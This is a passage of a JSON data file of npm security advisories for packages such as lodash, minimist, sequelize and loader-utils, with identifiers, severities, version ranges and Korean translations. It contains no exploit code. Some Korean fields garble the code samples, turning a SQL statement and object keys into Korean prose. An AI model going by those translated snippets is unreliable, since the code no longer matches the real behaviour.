    "descriptionKR": "npm `ssri` 5.2.2-6.0.1 및 7.0.0-8.0.0은 서비스 거부에 취약한 정규식을 사용하여 SRI를 처리합니다. 악성 SRI는 처리하는 데 매우 오랜 시간이 걸리며 서비스 거부로 이어질 수 있습니다. 이 문제는 strict 옵션을 사용하는 소비자에게만 영향을 미칩니다."
  },
  {
    "description": "npm `ssri` 5.2.2-6.0.1 and 7.0.0-8.0.0, processes SRIs using a regular expression which is vulnerable to a denial of service. Malicious SRIs could take an extremely long time to process, leading to denial of service. This issue only affects consumers using the strict option.",
    "identifiers": "GHSA : GHSA-vx3p-948g-6vhq\nCVE : CVE-2021-27290",
    "severity": "HIGH",
    "updatedAt": "2023-02-28T22:51:14Z",
    "publishedAt": "2021-03-19T21:24:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-27290\nhttps://github.com/npm/ssri/commit/76e223317d971f19e4db8191865bdad5edee40d2\nhttps://doyensec.com/resources/Doyensec_Advisory_ssri_redos.pdf\nhttps://github.com/yetingli/SaveResults/blob/main/pdf/ssri-redos.pdf\nhttps://github.com/npm/ssri/commit/b30dfdb00bb94ddc49a25a85a18fb27afafdfbb1\nhttps://www.npmjs.com/package/ssri\nhttps://github.com/npm/ssri/pull/20#issuecomment-842677644\nhttps://npmjs.com\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/npm/ssri/commit/809c84d09ea87c3857fa171d42914586899d4538\nhttps://github.com/advisories/GHSA-vx3p-948g-6vhq",
    "name": "ssri",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.2.2, < 6.0.2",
    "identifier": "6.0.2",
    "descriptionKR": "npm `ssri` 5.2.2-6.0.1 및 7.0.0-8.0.0은 서비스 거부에 취약한 정규식을 사용하여 SRI를 처리합니다. 악성 SRI는 처리하는 데 매우 오랜 시간이 걸리며 서비스 거부로 이어질 수 있습니다. 이 문제는 strict 옵션을 사용하는 소비자에게만 영향을 미칩니다."
  },
  {
    "description": "This affects the package glob-parent before 5.1.2. The enclosure regex used to check for strings ending in enclosure containing path separator.",
    "identifiers": "GHSA : GHSA-ww39-953v-wcq6\nCVE : CVE-2020-28469",
    "severity": "HIGH",
    "updatedAt": "2023-02-28T22:39:43Z",
    "publishedAt": "2021-06-07T21:56:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28469\nhttps://github.com/gulpjs/glob-parent/pull/36\nhttps://github.com/gulpjs/glob-parent/blob/6ce8d11f2f1ed8e80a9526b1dc8cf3aa71f43474/index.js%23L9\nhttps://github.com/gulpjs/glob-parent/releases/tag/v5.1.2\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBES128-1059093\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1059092\nhttps://snyk.io/vuln/SNYK-JS-GLOBPARENT-1016905\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://github.com/gulpjs/glob-parent/pull/36/commits/c6db86422a9731d4f3d332ce4a81c27ea6b0ee46\nhttps://github.com/advisories/GHSA-ww39-953v-wcq6",
    "name": "glob-parent",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.1.2",
    "identifier": "5.1.2",
    "descriptionKR": "이것은 5.1.2 이전의 패키지 glob-parent에 영향을 미칩니다. 경로 구분자를 포함하는 인클로저로 끝나는 문자열을 확인하는 데 사용되는 인클로저 정규식입니다."
  },
  {
    "description": "When fetching an url with a link to an external site (Redirect), the users Cookies & Autorisation headers are leaked to the third party application. According to the same-origin-policy, the header should be \"sanitized.\"",
    "identifiers": "GHSA : GHSA-6h5x-7c5m-7cr7\nCVE : CVE-2022-1650",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-24T19:33:50Z",
    "publishedAt": "2022-05-13T00:01:12Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-1650\nhttps://github.com/eventsource/eventsource/commit/10ee0c4881a6ba2fe65ec18ed195ac35889583c4\nhttps://huntr.dev/bounties/dc9e467f-be5d-4945-867d-1044d27e9b8e\nhttps://github.com/EventSource/eventsource/pull/273#issuecomment-1127624508\nhttps://github.com/EventSource/eventsource/commit/f9f6416567bff62c1af2f4314be51d9870e94bc2\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00021.html\nhttps://github.com/advisories/GHSA-6h5x-7c5m-7cr7",
    "name": "eventsource",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.0.2",
    "identifier": "2.0.2",
    "descriptionKR": "외부 사이트(리디렉션)에 대한 링크가 있는 URL을 가져올 때 사용자 쿠키 및 자동화 헤더가 타사 애플리케이션으로 유출됩니다. same-origin-policy에 따라 헤더는 \"삭제\"되어야 합니다."
  },
  {
    "description": "When fetching an url with a link to an external site (Redirect), the users Cookies & Autorisation headers are leaked to the third party application. According to the same-origin-policy, the header should be \"sanitized.\"",
    "identifiers": "GHSA : GHSA-6h5x-7c5m-7cr7\nCVE : CVE-2022-1650",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-24T19:33:50Z",
    "publishedAt": "2022-05-13T00:01:12Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-1650\nhttps://github.com/eventsource/eventsource/commit/10ee0c4881a6ba2fe65ec18ed195ac35889583c4\nhttps://huntr.dev/bounties/dc9e467f-be5d-4945-867d-1044d27e9b8e\nhttps://github.com/EventSource/eventsource/pull/273#issuecomment-1127624508\nhttps://github.com/EventSource/eventsource/commit/f9f6416567bff62c1af2f4314be51d9870e94bc2\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00021.html\nhttps://github.com/advisories/GHSA-6h5x-7c5m-7cr7",
    "name": "eventsource",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.1",
    "identifier": "1.1.1",
    "descriptionKR": "외부 사이트(리디렉션)에 대한 링크가 있는 URL을 가져올 때 사용자 쿠키 및 자동화 헤더가 타사 애플리케이션으로 유출됩니다. same-origin-policy에 따라 헤더는 \"삭제\"되어야 합니다."
  },
  {
    "description": "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
    "identifiers": "GHSA : GHSA-35jh-r3h4-6jhm\nCVE : CVE-2021-23337",
    "severity": "HIGH",
    "updatedAt": "2023-04-26T17:56:06Z",
    "publishedAt": "2021-05-06T16:05:51Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337\nhttps://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\nhttps://security.netapp.com/advisory/ntap-20210312-0006/\nhttps://snyk.io/vuln/SNYK-JS-LODASH-1040724\nhttps://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851\nhttps://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js%23L14851\nhttps://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074932\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074930\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074928\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074931\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074929\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://www.oracle.com/security-alerts/cpujul2022.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\nhttps://github.com/advisories/GHSA-35jh-r3h4-6jhm",
    "name": "lodash-es",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.21",
    "identifier": "4.17.21",
    "descriptionKR": "4.17.21 이전의 `lodash` 버전은 템플릿 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
    "identifiers": "GHSA : GHSA-35jh-r3h4-6jhm\nCVE : CVE-2021-23337",
    "severity": "HIGH",
    "updatedAt": "2023-04-26T17:56:06Z",
    "publishedAt": "2021-05-06T16:05:51Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337\nhttps://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\nhttps://security.netapp.com/advisory/ntap-20210312-0006/\nhttps://snyk.io/vuln/SNYK-JS-LODASH-1040724\nhttps://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851\nhttps://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js%23L14851\nhttps://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074932\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074930\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074928\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074931\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074929\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://www.oracle.com/security-alerts/cpujul2022.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\nhttps://github.com/advisories/GHSA-35jh-r3h4-6jhm",
    "name": "lodash",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.21",
    "identifier": "4.17.21",
    "descriptionKR": "4.17.21 이전의 `lodash` 버전은 템플릿 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils prior to version 2.0.3 via the name variable in parseQuery.js.",
    "identifiers": "GHSA : GHSA-76p3-8jx3-jpfq\nCVE : CVE-2022-37601",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-28T22:11:40Z",
    "publishedAt": "2022-10-13T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37601\nhttps://github.com/webpack/loader-utils/issues/212\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/parseQuery.js#L11\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/parseQuery.js#L47\nhttps://github.com/webpack/loader-utils/releases/tag/v2.0.3\nhttps://github.com/webpack/loader-utils/pull/217\nhttps://github.com/webpack/loader-utils/pull/220\nhttps://github.com/webpack/loader-utils/releases/tag/v1.4.1\nhttps://github.com/webpack/loader-utils/issues/212#issuecomment-1319192884\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1319412826\nhttps://dl.acm.org/doi/abs/10.1145/3488932.3497769\nhttps://dl.acm.org/doi/pdf/10.1145/3488932.3497769\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00044.html\nhttp://users.encs.concordia.ca/~mmannan/publications/JS-vulnerability-aisaccs2022.pdf\nhttps://github.com/webpack/loader-utils/pull/217/commits/f4e48a232fae900237c3e5ff7b57ce9e1c734de1\nhttps://github.com/webpack/loader-utils/pull/220/commits/a49c061ef272bc0c61cc1d996f83bb0e3b4daa9e\nhttps://github.com/advisories/GHSA-76p3-8jx3-jpfq",
    "name": "loader-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.4.1",
    "identifier": "1.4.1",
    "descriptionKR": "parseQuery.js의 이름 변수를 통해 버전 2.0.3 이전의 webpack loader-utils에서 parseQuery.js의 parseQuery 함수에 있는 프로토타입 오염 취약성."
  },
  {
    "description": "Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils prior to version 2.0.3 via the name variable in parseQuery.js.",
    "identifiers": "GHSA : GHSA-76p3-8jx3-jpfq\nCVE : CVE-2022-37601",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-28T22:11:40Z",
    "publishedAt": "2022-10-13T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37601\nhttps://github.com/webpack/loader-utils/issues/212\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/parseQuery.js#L11\nhttps://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/parseQuery.js#L47\nhttps://github.com/webpack/loader-utils/releases/tag/v2.0.3\nhttps://github.com/webpack/loader-utils/pull/217\nhttps://github.com/webpack/loader-utils/pull/220\nhttps://github.com/webpack/loader-utils/releases/tag/v1.4.1\nhttps://github.com/webpack/loader-utils/issues/212#issuecomment-1319192884\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1319412826\nhttps://dl.acm.org/doi/abs/10.1145/3488932.3497769\nhttps://dl.acm.org/doi/pdf/10.1145/3488932.3497769\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00044.html\nhttp://users.encs.concordia.ca/~mmannan/publications/JS-vulnerability-aisaccs2022.pdf\nhttps://github.com/webpack/loader-utils/pull/217/commits/f4e48a232fae900237c3e5ff7b57ce9e1c734de1\nhttps://github.com/webpack/loader-utils/pull/220/commits/a49c061ef272bc0c61cc1d996f83bb0e3b4daa9e\nhttps://github.com/advisories/GHSA-76p3-8jx3-jpfq",
    "name": "loader-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.0.3",
    "identifier": "2.0.3",
    "descriptionKR": "parseQuery.js의 이름 변수를 통해 버전 2.0.3 이전의 webpack loader-utils에서 parseQuery.js의 parseQuery 함수에 있는 프로토타입 오염 취약성."
  },
  {
    "description": "A vulnerability was found in the minimatch package. This flaw allows a Regular Expression Denial of Service (ReDoS) when calling the braceExpand function with specific arguments, resulting in a Denial of Service.",
    "identifiers": "GHSA : GHSA-f8q6-p94x-37v3\nCVE : CVE-2022-3517",
    "severity": "HIGH",
    "updatedAt": "2023-07-21T21:33:50Z",
    "publishedAt": "2022-10-18T12:00:32Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3517\nhttps://github.com/grafana/grafana-image-renderer/issues/329\nhttps://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6\nhttps://github.com/nodejs/node/issues/42510\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00011.html\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MTEUUTNIEBHGKUKKLNUZSV7IEP6IP3Q3/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UM6XJ73Q3NAM5KSGCOKJ2ZIA6GUWUJLK/\nhttps://github.com/advisories/GHSA-f8q6-p94x-37v3",
    "name": "minimatch",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.5",
    "identifier": "3.0.5",
    "descriptionKR": "minimatch 패키지에서 취약점이 발견되었습니다. 이 결함은 특정 인수를 사용하여 braceExpand 함수를 호출할 때 정규 표현식 서비스 거부(ReDoS)를 허용하여 서비스 거부를 초래합니다."
  },
  {
    "description": "Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95).",
    "identifiers": "GHSA : GHSA-xvch-5gv4-984h\nCVE : CVE-2021-44906",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-28T17:44:01Z",
    "publishedAt": "2022-03-18T00:01:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-44906\nhttps://github.com/substack/minimist/issues/164\nhttps://github.com/substack/minimist/blob/master/index.js#L69\nhttps://snyk.io/vuln/SNYK-JS-MINIMIST-559764\nhttps://stackoverflow.com/questions/8588563/adding-custom-properties-to-a-function/20278068#20278068\nhttps://github.com/Marynk/JavaScript-vulnerability-detection/blob/main/minimist%20PoC.zip\nhttps://github.com/minimistjs/minimist/issues/11\nhttps://github.com/minimistjs/minimist/pull/24\nhttps://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703\nhttps://github.com/minimistjs/minimist/commit/bc8ecee43875261f4f17eb20b1243d3ed15e70eb\nhttps://github.com/minimistjs/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d\nhttps://github.com/minimistjs/minimist/commit/ef9153fc52b6cea0744b2239921c5dcae4697f11\nhttps://github.com/minimistjs/minimist/commits/v0.2.4\nhttps://github.com/advisories/GHSA-xvch-5gv4-984h",
    "name": "minimist",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.4",
    "identifier": "0.2.4",
    "descriptionKR": "1.2.6 및 0.2.4 이전의 Minimist는 `index.js` 파일, `setKey()` 함수(69-95행)를 통한 Prototype Pollution에 취약합니다."
  },
  {
    "description": "Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95).",
    "identifiers": "GHSA : GHSA-xvch-5gv4-984h\nCVE : CVE-2021-44906",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-28T17:44:01Z",
    "publishedAt": "2022-03-18T00:01:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-44906\nhttps://github.com/substack/minimist/issues/164\nhttps://github.com/substack/minimist/blob/master/index.js#L69\nhttps://snyk.io/vuln/SNYK-JS-MINIMIST-559764\nhttps://stackoverflow.com/questions/8588563/adding-custom-properties-to-a-function/20278068#20278068\nhttps://github.com/Marynk/JavaScript-vulnerability-detection/blob/main/minimist%20PoC.zip\nhttps://github.com/minimistjs/minimist/issues/11\nhttps://github.com/minimistjs/minimist/pull/24\nhttps://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703\nhttps://github.com/minimistjs/minimist/commit/bc8ecee43875261f4f17eb20b1243d3ed15e70eb\nhttps://github.com/minimistjs/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d\nhttps://github.com/minimistjs/minimist/commit/ef9153fc52b6cea0744b2239921c5dcae4697f11\nhttps://github.com/minimistjs/minimist/commits/v0.2.4\nhttps://github.com/advisories/GHSA-xvch-5gv4-984h",
    "name": "minimist",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, < 1.2.6",
    "identifier": "1.2.6",
    "descriptionKR": "1.2.6 및 0.2.4 이전의 Minimist는 `index.js` 파일, `setKey()` 함수(69-95행)를 통한 Prototype Pollution에 취약합니다."
  },
  {
    "description": "All versions of the package lite-web-server are vulnerable to Denial of Service (DoS) when an attacker sends an HTTP request and includes control characters that the decodeURI() function is unable to parse.",
    "identifiers": "GHSA : GHSA-8237-3q5g-99fv\nCVE : CVE-2023-26104",
    "severity": "HIGH",
    "updatedAt": "2023-02-27T14:56:33Z",
    "publishedAt": "2023-02-25T06:30:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26104\nhttps://gist.github.com/lirantal/637520812da06fffb91dd86d02ff6bde\nhttps://security.snyk.io/vuln/SNYK-JS-LITEWEBSERVER-3153703\nhttps://github.com/chasyumen/lite-web-server/blob/main/src/WebServer.js#23L274\nhttps://github.com/advisories/GHSA-8237-3q5g-99fv",
    "name": "lite-web-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.2.2",
    "descriptionKR": "패키지 lite-web-server의 모든 버전은 공격자가 HTTP 요청을 보내고 decodeURI() 함수가 구문 분석할 수 없는 제어 문자를 포함할 때 서비스 거부(DoS)에 취약합니다."
  },
  {
    "description": "### Impact\n\nSequelize 6.28.2 and prior has a dangerous feature where using parentheses in the attribute option would make Sequelize use the string as-is in the SQL\n\n```ts\nUser.findAll({\n  attributes: [\n    ['count(id)', 'count']\n  ]\n});\n```\n\nProduced\n\n```sql\nSELECT count(id) AS \"count\" FROM \"users\"\n```\n\n### Patches\n\nThis feature was deprecated in Sequelize 5, and using it prints a deprecation warning.\n\nThis issue has been patched in [`@sequelize/core@7.0.0.alpha-20`](https://github.com/sequelize/sequelize/pull/15374) and [`sequelize@6.29.0`](https://github.com/sequelize/sequelize/pull/15710). \n\nIn Sequelize 7, it now produces the following:\n\n```sql\nSELECT \"count(id)\" AS \"count\" FROM \"users\"\n```\n\nIn Sequelize 6, it throws an error explaining that we had to introduce a breaking change, and requires the user to explicitly opt-in to either the Sequelize 7 behavior (always escape) or the Sequelize 5 behavior (inline attributes that include `()` without escaping). See https://github.com/sequelize/sequelize/pull/15710 for more information.\n\n### Mitigations\n\nDo not use user-provided content to build your list or attributes. If you do, make sure that attribute in question actually exists on your model by checking that it exists in the `rawAttributes` property of your model first.\n\n---\n\nA discussion thread about this issue is open at https://github.com/sequelize/sequelize/discussions/15694\nCVE: CVE-2023-22578",
    "identifiers": "GHSA : GHSA-f598-mfpv-gmfx\nCVE : CVE-2023-22578",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-24T18:48:51Z",
    "publishedAt": "2023-02-24T18:48:49Z",
    "references": "https://github.com/sequelize/sequelize/security/advisories/GHSA-f598-mfpv-gmfx\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22578\nhttps://github.com/sequelize/sequelize/pull/15710\nhttps://csirt.divd.nl/CVE-2023-22578\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/sequelize/sequelize/discussions/15694\nhttps://github.com/sequelize/sequelize/releases/tag/v6.29.0\nhttps://github.com/sequelize/sequelize/releases/tag/v7.0.0-alpha.20\nhttps://github.com/advisories/GHSA-f598-mfpv-gmfx",
    "name": "sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.29.0",
    "identifier": "6.29.0",
    "descriptionKR": "### 영향\n\nSequelize 6.28.2 및 이전 버전에는 속성 옵션에 괄호를 사용하면 Sequelize가 SQL에서 문자열을 있는 그대로 사용하게 만드는 위험한 기능이 있습니다.\n\n```ts\nUser.findAll({\n  속성: [\n    ['카운트(id)', '카운트']\n  ]\n});\n```\n\n제작\n\n```sql\nSELECT count(id) AS \"count\" FROM \"사용자\"\n```\n\n### 패치\n\n이 기능은 Sequelize 5에서 더 이상 사용되지 않으며 이를 사용하면 사용 중단 경고가 인쇄됩니다.\n\n이 문제는 [`@sequelize/core@7.0.0.alpha-20`](https://github.com/sequelize/sequelize/pull/15374) 및 [`sequelize@6.29.0`]( https://github.com/sequelize/sequelize/pull/15710).\n\nSequelize 7에서는 이제 다음을 생성합니다.\n\n```sql\n\"사용자\"에서 \"개수\"로 \"개수(ID)\"를 선택합니다.\n```\n\nSequelize 6에서는 주요 변경 사항을 도입해야 한다고 설명하는 오류가 발생하고 사용자가 Sequelize 7 동작(항상 이스케이프) 또는 Sequelize 5 동작(`()을 포함하는 인라인 속성)을 명시적으로 선택해야 합니다. ` 탈출하지 않고). 자세한 내용은 https://github.com/sequelize/sequelize/pull/15710을 참조하세요.\n\n### 완화\n\n사용자 제공 콘텐츠를 사용하여 목록 또는 속성을 구축하지 마십시오. 그렇다면 문제의 속성이 모델의 'rawAttributes' 속성에 먼저 존재하는지 확인하여 문제의 속성이 모델에 실제로 존재하는지 확인하세요.\n\n---\n\n이 문제에 대한 토론 스레드는 https://github.com/sequelize/sequelize/discussions/15694에서 열려 있습니다.\nCVE: CVE-2023-22578"
  },
  {
    "description": "### Impact\n\nSequelize 6.28.2 and prior has a dangerous feature where using parentheses in the attribute option would make Sequelize use the string as-is in the SQL\n\n```ts\nUser.findAll({\n  attributes: [\n    ['count(id)', 'count']\n  ]\n});\n```\n\nProduced\n\n```sql\nSELECT count(id) AS \"count\" FROM \"users\"\n```\n\n### Patches\n\nThis feature was deprecated in Sequelize 5, and using it prints a deprecation warning.\n\nThis issue has been patched in [`@sequelize/core@7.0.0.alpha-20`](https://github.com/sequelize/sequelize/pull/15374) and [`sequelize@6.29.0`](https://github.com/sequelize/sequelize/pull/15710). \n\nIn Sequelize 7, it now produces the following:\n\n```sql\nSELECT \"count(id)\" AS \"count\" FROM \"users\"\n```\n\nIn Sequelize 6, it throws an error explaining that we had to introduce a breaking change, and requires the user to explicitly opt-in to either the Sequelize 7 behavior (always escape) or the Sequelize 5 behavior (inline attributes that include `()` without escaping). See https://github.com/sequelize/sequelize/pull/15710 for more information.\n\n### Mitigations\n\nDo not use user-provided content to build your list or attributes. If you do, make sure that attribute in question actually exists on your model by checking that it exists in the `rawAttributes` property of your model first.\n\n---\n\nA discussion thread about this issue is open at https://github.com/sequelize/sequelize/discussions/15694\nCVE: CVE-2023-22578",
    "identifiers": "GHSA : GHSA-f598-mfpv-gmfx\nCVE : CVE-2023-22578",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-24T18:48:51Z",
    "publishedAt": "2023-02-24T18:48:49Z",
    "references": "https://github.com/sequelize/sequelize/security/advisories/GHSA-f598-mfpv-gmfx\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22578\nhttps://github.com/sequelize/sequelize/pull/15710\nhttps://csirt.divd.nl/CVE-2023-22578\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/sequelize/sequelize/discussions/15694\nhttps://github.com/sequelize/sequelize/releases/tag/v6.29.0\nhttps://github.com/sequelize/sequelize/releases/tag/v7.0.0-alpha.20\nhttps://github.com/advisories/GHSA-f598-mfpv-gmfx",
    "name": "@sequelize/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.0.0-alpha.20",
    "identifier": "7.0.0-alpha.20",
    "descriptionKR": "### 영향\n\nSequelize 6.28.2 및 이전 버전에는 속성 옵션에 괄호를 사용하면 Sequelize가 SQL에서 문자열을 있는 그대로 사용하게 만드는 위험한 기능이 있습니다.\n\n```ts\nUser.findAll({\n  속성: [\n    ['카운트(id)', '카운트']\n  ]\n});\n```\n\n제작\n\n```sql\nSELECT count(id) AS \"count\" FROM \"사용자\"\n```\n\n### 패치\n\n이 기능은 Sequelize 5에서 더 이상 사용되지 않으며 이를 사용하면 사용 중단 경고가 인쇄됩니다.\n\n이 문제는 [`@sequelize/core@7.0.0.alpha-20`](https://github.com/sequelize/sequelize/pull/15374) 및 [`sequelize@6.29.0`]( https://github.com/sequelize/sequelize/pull/15710).\n\nSequelize 7에서는 이제 다음을 생성합니다.\n\n```sql\n\"사용자\"에서 \"개수\"로 \"개수(ID)\"를 선택합니다.\n```\n\nSequelize 6에서는 주요 변경 사항을 도입해야 한다고 설명하는 오류가 발생하고 사용자가 Sequelize 7 동작(항상 이스케이프) 또는 Sequelize 5 동작(`()을 포함하는 인라인 속성)을 명시적으로 선택해야 합니다. ` 탈출하지 않고). 자세한 내용은 https://github.com/sequelize/sequelize/pull/15710을 참조하십시오.\n\n### 완화\n\n사용자 제공 콘텐츠를 사용하여 목록 또는 속성을 구축하지 마십시오. 그렇다면 문제의 속성이 모델의 'rawAttributes' 속성에 먼저 존재하는지 확인하여 문제의 속성이 모델에 실제로 존재하는지 확인하세요.\n\n---\n\n이 문제에 대한 토론 스레드는 https://github.com/sequelize/sequelize/discussions/15694에서 열려 있습니다.\nCVE: CVE-2023-22578"
  },
  {
    "description": "## Duplicate advisory\nThis advisory has been withdrawn because it is a duplicate of [GHSA-f598-mfpv-gmfx](https://github.com/advisories/GHSA-f598-mfpv-gmfx). This link is maintained to preserve external references.\n\n## Original Description\nDue to improper attribute filtering in the sequelize js library, an attacker can peform SQL injections. This issue can be mitigated by not accepting untrusted input.",
    "identifiers": "GHSA : GHSA-8mwq-mj73-qv68",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-24T18:48:36Z",
    "publishedAt": "2023-02-16T15:30:28Z",
    "withdrawnAt": "2023-02-24T18:48:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-22578\nhttps://csirt.divd.nl/CVE-2023-22578\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/sequelize/sequelize/discussions/15694\nhttps://github.com/sequelize/sequelize/releases/tag/v7.0.0-alpha.20\nhttps://github.com/advisories/GHSA-8mwq-mj73-qv68",
    "name": "sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 6.28.2",
    "identifier": "6.29.0",
    "descriptionKR": "## 중복 권고\n이 권고는 [GHSA-f598-mfpv-gmfx](https://github.com/advisories/GHSA-f598-mfpv-gmfx)와 중복되기 때문에 철회되었습니다. 이 링크는 외부 참조를 보존하기 위해 유지됩니다.\n\n## 원본 설명\nSequelize js 라이브러리의 부적절한 속성 필터링으로 인해 공격자가 SQL 주입을 수행할 수 있습니다. 이 문제는 신뢰할 수 없는 입력을 허용하지 않음으로써 완화할 수 있습니다."
  },
  {
    "description": "All versions of the package rangy are vulnerable to Prototype Pollution when using the `extend()` function in file `rangy-core.js`.The function uses recursive merge which can lead an attacker to modify properties of the Object.prototype.",
    "identifiers": "GHSA : GHSA-65rp-mhqf-8gj3\nCVE : CVE-2023-26102",
    "severity": "HIGH",
    "updatedAt": "2023-03-03T00:12:20Z",
    "publishedAt": "2023-02-24T06:30:16Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26102\nhttps://github.com/timdown/rangy/issues/478\nhttps://security.snyk.io/vuln/SNYK-JS-RANGY-3175702\nhttps://github.com/advisories/GHSA-65rp-mhqf-8gj3",
    "name": "rangy",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.3.1",
    "descriptionKR": "rangy 패키지의 모든 버전은 `rangy-core.js` 파일에서 `extend()` 함수를 사용할 때 Prototype Pollution에 취약합니다. 이 함수는 공격자가 Object.prototype의 속성을 수정하도록 유도할 수 있는 재귀 병합을 사용합니다."
  },
  {
    "description": "sanitize-url (aka @braintree/sanitize-url) before 6.0.1 allows XSS via HTML entities.",
